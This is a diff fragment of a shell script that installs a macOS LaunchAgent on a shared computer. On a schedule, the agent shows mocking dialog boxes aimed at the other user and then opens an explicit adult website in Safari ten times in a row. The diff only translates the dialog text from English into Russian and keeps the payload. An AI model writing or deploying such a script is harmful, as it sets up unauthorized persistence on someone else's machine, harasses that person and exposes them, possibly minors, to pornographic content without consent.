@@ -25,7 +25,7 @@ cat > ~/Library/LaunchAgents/com.blender.artist.plist << 'EOF'
     <array>
         <string>/bin/bash</string>
         <string>-c</string>
-        <string>FLAG="$HOME/.blender_artist_flag"; if [ ! -f "$FLAG" ]; then osascript -e 'display dialog "Stop making dicks in Blender on my computer." buttons {"No"} default button 1 with title "Hey"' &amp;&amp; osascript -e 'display dialog "Stop taking 500 screenshots every time I leave the room." buttons {"Fair enough"} default button 1 with title "Also"' &amp;&amp; osascript -e 'display dialog "This is what you get." buttons {"Oh no"} default button 1 with title "Too Late"' &amp;&amp; touch "$FLAG"; fi; for i in $(seq 1 10); do open -a Safari https://www.xvideos.com; sleep 3; done</string>
+        <string>FLAG="$HOME/.blender_artist_flag"; if [ ! -f "$FLAG" ]; then osascript -e 'display dialog "Хватит лепить члены в Blender на моём компе." buttons {"Нет"} default button 1 with title "Привет"' &amp;&amp; osascript -e 'display dialog "Хватит делать 500 скриншотов каждый раз, когда я выхожу из комнаты." buttons {"Ладно"} default button 1 with title "И ещё"' &amp;&amp; osascript -e 'display dialog "Вот что тебе за это будет." buttons {"Ой"} default button 1 with title "Поздно"' &amp;&amp; touch "$FLAG"; fi; for i in $(seq 1 10); do open -a Safari https://www.xvideos.com; sleep 3; done</string>
     </array>
     <key>StartCalendarInterval</key>
     <dict>
